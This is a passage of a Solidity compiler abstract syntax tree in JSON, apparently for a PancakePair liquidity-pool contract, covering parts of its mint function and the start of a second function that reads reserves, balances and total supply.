																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 996,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 884,
															"src": "6116:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 997,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 886,
															"src": "6127:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 993,
														"name": "_update",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 762,
														"src": "6088:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint256_$_t_uint256_$_t_uint112_$_t_uint112_$returns$__$",
															"typeString": "function (uint256,uint256,uint112,uint112)"
														}
													},
													"id": 998,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6088:49:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 999,
												"nodeType": "ExpressionStatement",
												"src": "6088:49:1"
											},
											{
												"condition": {
													"argumentTypes": null,
													"id": 1000,
													"name": "feeOn",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 927,
													"src": "6151:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1010,
												"nodeType": "IfStatement",
												"src": "6147:47:1",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"id": 1008,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 1001,
															"name": "kLast",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 491,
															"src": "6158:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1006,
																	"name": "reserve1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 483,
																	"src": "6185:8:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 1003,
																			"name": "reserve0",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 481,
																			"src": "6171:8:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint112",
																				"typeString": "uint112"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint112",
																				"typeString": "uint112"
																			}
																		],
																		"id": 1002,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "6166:4:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint256_$",
																			"typeString": "type(uint256)"
																		},
																		"typeName": "uint"
																	},
																	"id": 1004,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "6166:14:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 1005,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "mul",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 2385,
																"src": "6166:18:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 1007,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "6166:28:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "6158:36:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1009,
													"nodeType": "ExpressionStatement",
													"src": "6158:36:1"
												}
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 1012,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2443,
																"src": "6254:3:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 1013,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "6254:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 1014,
															"name": "amount0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 913,
															"src": "6266:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1015,
															"name": "amount1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 920,
															"src": "6275:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1011,
														"name": "Mint",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															585
														],
														"referencedDeclaration": 585,
														"src": "6249:4:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_uint256_$_t_uint256_$returns$__$",
															"typeString": "function (address,uint256,uint256)"
														}
													},
													"id": 1016,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6249:34:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1017,
												"nodeType": "EmitStatement",
												"src": "6244:39:1"
											}
										]
									},
									"documentation": null,
									"id": 1019,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 879,
											"modifierName": {
												"argumentTypes": null,
												"id": 878,
												"name": "lock",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 513,
												"src": "5060:4:1",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "5060:4:1"
										}
									],
									"name": "mint",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 877,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 876,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1019,
												"src": "5039:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 875,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5039:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5038:12:1"
									},
									"returnParameters": {
										"id": 882,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 881,
												"name": "liquidity",
												"nodeType": "VariableDeclaration",
												"scope": 1019,
												"src": "5074:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 880,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "5074:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5073:16:1"
									},
									"scope": 1700,
									"src": "5025:1265:1",
									"stateMutability": "nonpayable",
									"superFunction": 2190,
									"visibility": "external"
								},
								{
									"body": {
										"id": 1163,
										"nodeType": "Block",
										"src": "6468:1212:1",
										"statements": [
											{
												"assignments": [
													1029,
													1031,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 1029,
														"name": "_reserve0",
														"nodeType": "VariableDeclaration",
														"scope": 1163,
														"src": "6479:17:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 1028,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "6479:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													{
														"constant": false,
														"id": 1031,
														"name": "_reserve1",
														"nodeType": "VariableDeclaration",
														"scope": 1163,
														"src": "6498:17:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 1030,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "6498:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													null
												],
												"id": 1034,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1032,
														"name": "getReserves",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 535,
														"src": "6521:11:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_view$__$returns$_t_uint112_$_t_uint112_$_t_uint32_$",
															"typeString": "function () view returns (uint112,uint112,uint32)"
														}
													},
													"id": 1033,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6521:13:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_uint112_$_t_uint112_$_t_uint32_$",
														"typeString": "tuple(uint112,uint112,uint32)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6478:56:1"
											},
											{
												"assignments": [
													1036
												],
												"declarations": [
													{
														"constant": false,
														"id": 1036,
														"name": "balance0",
														"nodeType": "VariableDeclaration",
														"scope": 1163,
														"src": "6559:13:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1035,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6559:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1045,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1042,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2475,
																	"src": "6608:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_PancakePair_$1700",
																		"typeString": "contract PancakePair"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_PancakePair_$1700",
																		"typeString": "contract PancakePair"
																	}
																],
																"id": 1041,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "6600:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 1043,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "6600:13:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1038,
																	"name": "token0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 475,
																	"src": "6582:6:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1037,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1784,
																"src": "6575:6:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$1784_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 1039,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "6575:14:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$1784",
																"typeString": "contract IERC20"
															}
														},
														"id": 1040,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balanceOf",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 1745,
														"src": "6575:24:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address) view external returns (uint256)"
														}
													},
													"id": 1044,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6575:39:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6559:55:1"
											},
											{
												"assignments": [
													1047
												],
												"declarations": [
													{
														"constant": false,
														"id": 1047,
														"name": "balance1",
														"nodeType": "VariableDeclaration",
														"scope": 1163,
														"src": "6624:13:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1046,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6624:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1056,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1053,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2475,
																	"src": "6673:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_PancakePair_$1700",
																		"typeString": "contract PancakePair"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_PancakePair_$1700",
																		"typeString": "contract PancakePair"
																	}
																],
																"id": 1052,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "6665:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 1054,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "6665:13:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1049,
																	"name": "token1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 477,
																	"src": "6647:6:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1048,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1784,
																"src": "6640:6:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$1784_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 1050,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "6640:14:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$1784",
																"typeString": "contract IERC20"
															}
														},
														"id": 1051,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balanceOf",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 1745,
														"src": "6640:24:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address) view external returns (uint256)"
														}
													},
													"id": 1055,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6640:39:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6624:55:1"
											},
											{
												"assignments": [
													1058
												],
												"declarations": [
													{
														"constant": false,
														"id": 1058,
														"name": "amount0",
														"nodeType": "VariableDeclaration",
														"scope": 1163,
														"src": "6689:12:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1057,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6689:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1063,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1061,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1029,
															"src": "6717:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 1059,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1036,
															"src": "6704:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 1060,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sub",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 2357,
														"src": "6704:12:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
															"typeString": "function (uint256,uint256) pure returns (uint256)"
														}
													},
													"id": 1062,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6704:23:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6689:38:1"
											},
											{
												"assignments": [
													1065
												],
												"declarations": [
													{
														"constant": false,
														"id": 1065,
														"name": "amount1",
														"nodeType": "VariableDeclaration",
														"scope": 1163,
														"src": "6737:12:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1064,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6737:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1070,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1068,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1031,
															"src": "6765:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 1066,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1047,
															"src": "6752:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 1067,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sub",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 2357,
														"src": "6752:12:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
															"typeString": "function (uint256,uint256) pure returns (uint256)"
														}
													},
													"id": 1069,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6752:23:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6737:38:1"
											},
											{
												"assignments": [
													1072
												],
												"declarations": [
													{
														"constant": false,
														"id": 1072,
														"name": "feeOn",
														"nodeType": "VariableDeclaration",
														"scope": 1163,
														"src": "6786:10:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 1071,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "6786:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1077,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1074,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1029,
															"src": "6808:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 1075,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1031,
															"src": "6819:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 1073,
														"name": "_mintFee",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 874,
														"src": "6799:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint112_$_t_uint112_$returns$_t_bool_$",
															"typeString": "function (uint112,uint112) returns (bool)"
														}
													},
													"id": 1076,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6799:30:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6786:43:1"
											},
											{
												"assignments": [
													1079
												],
												"declarations": [
													{
														"constant": false,
														"id": 1079,
														"name": "_totalSupply",
														"nodeType": "VariableDeclaration",
														"scope": 1163,
														"src": "6839:17:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1078,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6839:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1081,
												"initialValue": {
													"argumentTypes": null,
													"id": 1080,
													"name": "totalSupply",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 19,
													"src": "6859:11:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6839:31:1"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1084,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1082,
														"name": "_totalSupply",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1079,
														"src": "6962:12:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1083,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6978:1:1",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "6962:17:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 1124,
													"nodeType": "Block",
													"src": "7188:169:1",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1122,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1106,
																	"name": "liquidity",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1026,
																	"src": "7202:9:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1114,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 1111,
																						"name": "_totalSupply",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1079,
																						"src": "7252:12:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					],
																					"expression": {
																						"argumentTypes": null,
																						"id": 1109,
																						"name": "amount0",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1058,
																						"src": "7240:7:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 1110,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"memberName": "mul",
																					"nodeType": "MemberAccess",
																					"referencedDeclaration": 2385,
																					"src": "7240:11:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																						"typeString": "function (uint256,uint256) pure returns (uint256)"
																					}
																				},
																				"id": 1112,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "7240:25:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
